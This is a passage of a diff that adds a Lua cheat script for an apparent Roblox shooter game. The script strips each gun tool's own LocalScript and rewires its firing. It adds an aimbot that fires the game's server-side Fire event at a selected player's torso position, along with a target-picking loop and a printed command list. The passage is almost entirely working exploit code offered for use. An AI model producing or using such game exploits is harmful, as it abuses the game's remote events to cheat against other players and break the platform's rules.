+					if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
+						local plr = ms2plr()
+						if plr then
+							target = plr
+							TextBox.Text = plr.Name
+						end
+					end
+				end
+			end
+		end
+	end)
+	
+	TextBox.FocusLost:Connect(function()
+		local plr = psearch(TextBox.Text)
+		if plr then
+			if plr ~= game.Players.LocalPlayer then
+				target = plr
+				TextBox.Text = plr.Name
+			else TextBox.Text = ""
+			end
+		else TextBox.Text = ""
+		end
+	end)
+	
+	game.Players.LocalPlayer.CharacterAdded:Connect(function()
+		wait(2)
+		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+			if v:FindFirstChild("Fire") then
+				v["LocalScript"]:Remove()
+			end
+		end
+		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+			if v:FindFirstChild("Fire") then
+				local l__LocalPlayer__1 = game.Players.LocalPlayer;
+				local l__Humanoid__2 = l__LocalPlayer__1.Character.Humanoid;
+				local l__Parent__3 = v
+				local l__mouse__4 = l__LocalPlayer__1:GetMouse();
+				local u2 = true;
+				l__Parent__3.Activated:connect(function()
+					if not AimbotEnabled then
+						if not l__LocalPlayer__1.PlayerGui:findFirstChild("LocalScript") then
+							return;
+						end;
+						if l__LocalPlayer__1.PlayerGui:findFirstChild("LocalScript").Disabled == true then
+							return;
+						end;
+						if not u2 then
+							return;
+						end;
+						if l__Parent__3.Reloader.Value == true then
+							l__Parent__3.Click:FireServer();
+							return;
+						end;
+						u2 = false;
+						local v5 = l__Humanoid__2:LoadAnimation(l__Parent__3.Fires);
+						l__Parent__3.Fire:FireServer(l__mouse__4.Hit);
+						v5:Play(0.1, 1, 2);
+						u2 = true;
+					end
+				end);
+			end
+		end
+		if game.Players.LocalPlayer.Character then
+			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
+				if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Fire") then
+					game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").LocalScript:Remove()
+					local l__LocalPlayer__1 = game.Players.LocalPlayer;
+					local l__Humanoid__2 = l__LocalPlayer__1.Character.Humanoid;
+					local l__Parent__3 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+					local l__mouse__4 = l__LocalPlayer__1:GetMouse();
+					local u2 = true;
+					l__Parent__3.Activated:connect(function()
+						if not AimbotEnabled then
+							if not l__LocalPlayer__1.PlayerGui:findFirstChild("LocalScript") then
+								return;
+							end;
+							if l__LocalPlayer__1.PlayerGui:findFirstChild("LocalScript").Disabled == true then
+								return;
+							end;
+							if not u2 then
+								return;
+							end;
+							if l__Parent__3.Reloader.Value == true then
+								l__Parent__3.Click:FireServer();
+								return;
+							end;
+							u2 = false;
+							local v5 = l__Humanoid__2:LoadAnimation(l__Parent__3.Fires);
+							l__Parent__3.Fire:FireServer(l__mouse__4.Hit);
+							v5:Play(0.1, 1, 2);
+							u2 = true;
+						end
+					end);
+				end
+			end
+		end	
+	end)
+	ms.Button2Down:Connect(function()
+		if AimbotEnabled then
+			if selectingtarget then
+				target = selectingtarget
+				TextBox.Text = target.Name
+				local se = CreateSelection(target)
+				local tgrt = selectingtarget
+				if se then
+					repeat wait() if target.Character then if target.Character:FindFirstChild("Torso") then se.Position = target.Character.Torso.Position end end until target ~= tgrt
+					se:Remove()
+				end
+			end
+		end
+	end)
+	ms.Button1Down:Connect(function()
+		if AimbotEnabled then
+			local ch = game.Players.LocalPlayer.Character
+			if ch then
+				local tool = ch:FindFirstChildOfClass("Tool")
+				if tool then
+					if tool:FindFirstChild("Fire") then
+						if target then
+							if target.Character then
+								if target.Character:FindFirstChild("Torso") then
+									tool:FindFirstChild("Fire"):FireServer(target.Character:FindFirstChild("Torso").CFrame)
+								end
+							end
+						end
+					end
+				end
+			end
+		end
+	end)
+	
+	wait(2)
+	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+		if v:FindFirstChild("Fire") then
+			v["LocalScript"]:Remove()
+		end
+	end
+	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+		if v:FindFirstChild("Fire") then
+			local l__LocalPlayer__1 = game.Players.LocalPlayer;
+			local l__Humanoid__2 = l__LocalPlayer__1.Character.Humanoid;
+			local l__Parent__3 = v
+			local l__mouse__4 = l__LocalPlayer__1:GetMouse();
+			local u2 = true;
+			l__Parent__3.Activated:connect(function()
+				if not AimbotEnabled then
+					if not l__LocalPlayer__1.PlayerGui:findFirstChild("LocalScript") then
+						return;
+					end;
+					if l__LocalPlayer__1.PlayerGui:findFirstChild("LocalScript").Disabled == true then
+						return;
+					end;
+					if not u2 then
+						return;
+					end;
+					if l__Parent__3.Reloader.Value == true then
+						l__Parent__3.Click:FireServer();
+						return;
+					end;
+					u2 = false;
+					local v5 = l__Humanoid__2:LoadAnimation(l__Parent__3.Fires);
+					l__Parent__3.Fire:FireServer(l__mouse__4.Hit);
+					v5:Play(0.1, 1, 2);
+					u2 = true;
+				end
+			end);
+		end
+	end
+	if game.Players.LocalPlayer.Character then
+		if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
+			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Fire") then
+				game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").LocalScript:Remove()
+				local l__LocalPlayer__1 = game.Players.LocalPlayer;
+				local l__Humanoid__2 = l__LocalPlayer__1.Character.Humanoid;
+				local l__Parent__3 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+				local l__mouse__4 = l__LocalPlayer__1:GetMouse();
+				local u2 = true;
+				l__Parent__3.Activated:connect(function()
+					if not AimbotEnabled then
+						if not l__LocalPlayer__1.PlayerGui:findFirstChild("LocalScript") then
+							return;
+						end;
+						if l__LocalPlayer__1.PlayerGui:findFirstChild("LocalScript").Disabled == true then
+							return;
+						end;
+						if not u2 then
+							return;
+						end;
+						if l__Parent__3.Reloader.Value == true then
+							l__Parent__3.Click:FireServer();
+							return;
+						end;
+						u2 = false;
+						local v5 = l__Humanoid__2:LoadAnimation(l__Parent__3.Fires);
+						l__Parent__3.Fire:FireServer(l__mouse__4.Hit);
+						v5:Play(0.1, 1, 2);
+						u2 = true;
+					end
+				end);
+			end
+		end
+	end
+
+notification("Loaded!")
+
+
+for i, v in pairs(COMBAT_SYSTEM.Commands) do
+	if type(v[2]) == "string" then
+		print(PREFIX..v[1].." - "..v[2])
+	else
+		print(PREFIX..v[1])
+	end
+end
+notification("System Working")
+
+
+while wait(0.1) do
+	if AimbotEnabled then
+		local Lch = game.Players.LocalPlayer.Character
+		if Lch then
+			local tool = Lch:FindFirstChildOfClass("Tool")
+			if tool then
+				if tool:FindFirstChild("Fire") then
+					local tplr = ms2plr()
+					if tplr then
+						if tplr.Character:FindFirstChild("Torso") then
+							selectingtarget = tplr
+							local se = CreateSelection(tplr)
+							if se then
+								repeat se.Position = tplr.Character.Torso.Position wait() until tplr ~= ms2plr()
+								se:Remove()
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+end
